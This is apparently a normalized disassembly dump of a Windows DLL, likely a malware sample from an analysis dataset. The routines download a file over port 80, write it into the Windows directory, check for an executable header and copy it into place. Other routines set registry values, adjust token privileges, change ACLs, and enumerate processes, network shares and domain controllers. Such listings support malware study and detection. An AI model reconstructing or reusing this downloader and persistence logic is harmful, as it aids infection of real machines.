mov [ esp + 0x118 ] eax
jne r-xdata
cmp eax esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x110
retn
push ebp
mov ebp [ fread@IAT ]
push edi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
mov [ esp + 0x128 ] esi
call ebp
add esp 0x10
test eax eax
je r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x110
retn
mov eax [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ecx eax
and ecx ebx
cmp [ esp + ecx + 0x18 ] bl
jne r-xdata
mov esi [ fclose@IAT ]
push edi
call esi
mov edx [ esp + 0x120 ]
push edx
call esi
add esp 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x110
retn
mov edx [ esp + 0x14 ]
and edx ebx
mov cl [ esp + edx + 0x18 ]
cmp cl bl
je r-xdata
and eax ebx
push edi
push 0x1
lea ecx [ esp + 0x1c ]
mov al [ esp + eax + 0x20 ]
push 0x1
push ecx
mov [ esp + 0x22 ] al
call ebp
add esp 0x10
test eax eax
je r-xdata
push edi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
call ebp
add esp 0x10
test eax eax
jne r-xdata
push edi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call ebp
add esp 0x10
test eax eax
jne r-xdata
mov eax esi
xor edx edx
mov ebp 0x3
div ebp
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esp + 0x118 ]
test eax eax
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ esp + 0x12 ]
shr cl 0x2
shl al 0x4
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov al [ esp + 0x12 ]
shr cl 0x4
shl al 0x2
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov [ esp + 0x12 ] cl
mov [ esp + 0x118 ] edx
jmp r-xdata
mov eax [ esp + 0x11c ]
lea ecx [ esp + 0x13 ]
push eax
push 0x1
push 0x1
push ecx
call [ fwrite@IAT ]
mov edx [ esp + 0x24 ]
add esp 0x10
and edx ebx
inc esi
mov al [ esp + edx + 0x18 ]
mov [ esp + 0x12 ] al
mov al [ esp + 0x12 ]
mov [ esp + 0x118 ] 0x1
shl al 0x6
or al cl
mov [ esp + 0x13 ] al
mov ebp [ fread@IAT ]
sub_10008ab0
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
push 0x2
lea ecx [ esp + 0x10 ]
push 0x1
push ecx
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
cmp [ esp + 0x8 ] 0x5a4d
jne r-xdata
mov eax 0x1
pop esi
retn
sub_10008b00
sub esp 0x8c
push ebx
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx [ esp + 0x94 ]
lea eax [ esp + 0x4 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
mov [ esp + 0x28 ] 0x0
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop ebx
add esp 0x8c
retn
mov edx [ esp + 0x4 ]
push ebp
push esi
lea eax [ esp + 0x14 ]
push edi
lea ecx [ esp + 0x1c ]
push eax
mov [ edx + ebx ] 0x0
push ecx
mov [ esp + 0x20 ] 0x80
call [ GetComputerNameA@IAT ]
mov edx [ esp + 0x10 ]
lea ebp [ ebx - 0x2 ]
add edx ebx
cmp ebp edx
jae r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop ebx
add esp 0x8c
retn
push ebx
call [ free@IAT ]
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8c
retn
test ebp ebp
je r-xdata
lea edi [ ebp + 0x2 ]
push 0xd
push edi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
lea esi [ esp + 0x1c ]
mov ecx edi
mov [ ebp ] 0x0
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov [ esp + 0x14 ] 0x1
mov ecx [ esp + 0x10 ]
add ecx ebx
cmp ebp ecx
jb r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
sub_10008c20
sub esp 0x210
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x210
retn
mov ecx [ esp + 0x220 ]
lea eax [ esp + 0xc ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_10003720
add esp 0x20
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push ebp
mov ebp [ GetWindowsDirectoryA@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
push edx
call ebp
mov edi [ esp + 0x228 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11c ]
[ edi ]
not ecx
sub edi ecx
push 0x104
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x20
push 0x2
mov ecx ebp
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
pop ebp
cmp esi 0xffffffff
je r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
push ebx
call [ free@IAT ]
add esp 0x4
test edi edi
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_10008240
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x118 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x118 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
call sub_100082f0
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0x118 ]
push ecx
call sub_10006d10
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x210
retn
lea edx [ esp + 0x14 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ esp + 0x118 ]
push eax
call sub_10008ab0
add esp 0x4
test eax eax
je r-xdata
sub_10008de0
push ecx
push ebp
push edi
push 0x3e800
xor ebp ebp
call [ malloc@IAT ]
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop ebp
pop ecx
retn
mov edx [ esp + 0x8 ]
push ebx
push esi
mov esi rw-data
mov [ edx + edi ] 0x0
mov eax edi
push edi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop ebp
pop ecx
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
call [ free@IAT ]
add esp 0x4
mov eax ebp
pop edi
pop ebp
pop ecx
retn
mov ebp 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop esi
pop ebx
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10008e90
push ecx
push rw-data
push rw-data
mov [ esp + 0x8 ] 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ esp ]
pop ecx
retn
lea eax [ esp ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
pop ecx
retn
sub_10008f00
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10008f2f
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10008f2f
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001000
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10008f2f
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10008f2f
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
j_sub_10001370
nop
nop
nop
nop
sub_10001370
push ecx
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_10001390
push 0x0
push 0x0
call [ CreateThread@IAT ]
xor eax eax
pop ecx
retn
RundllUninstallA
mov eax [ esp + 0xc ]
push eax
call UninstallService
pop ecx
retn 0x10
sub_10001860
push rw-data
push rw-data
push 0x80000002
call [ SHDeleteValueA@IAT ]
retn
sub_10001911
mov eax r-xdata
retn
sub_100020b0
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_10004110
push rw-data
call sub_10008de0
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_10008c20
add esp 0x8
retn
retn
sub_10004180
push rw-data
push rw-data
call sub_10008c20
add esp 0x8
retn
sub_100041a0
push rw-data
call sub_10008b00
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_10008c20
add esp 0x8
retn
retn
sub_100053f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
retn
sub_10005b50
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_10005b30
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_10006030
sub_10005ba0
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_10005b80
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_10006030
sub_10005bd0
mov eax [ rw-data ]
push eax
call sub_10006d10
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_10006030
sub_100066b0
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_10006740
add esp 0x8
retn
sub_10006fe0
mov eax [ rw-data ]
push 0x0
push eax
call [ rw-data ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_10006030
sub_10007d10
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
add ecx 0x2
push eax
push ecx
call sub_10007d30
add esp 0x8
retn
sub_10008130
push ecx
lea eax [ esp ]
push 0x4
push eax
push 0x4
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x18 ] 0x1
call [ SHSetValueA@IAT ]
pop ecx
retn
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_initterm
jmp [ _initterm@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
WNetEnumResourceA
jmp [ WNetEnumResourceA@IAT ]
WNetOpenEnumA
jmp [ WNetOpenEnumA@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetGetDCName
jmp [ NetGetDCName@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_100090b0
mov eax r--data
jmp __CxxFrameHandler
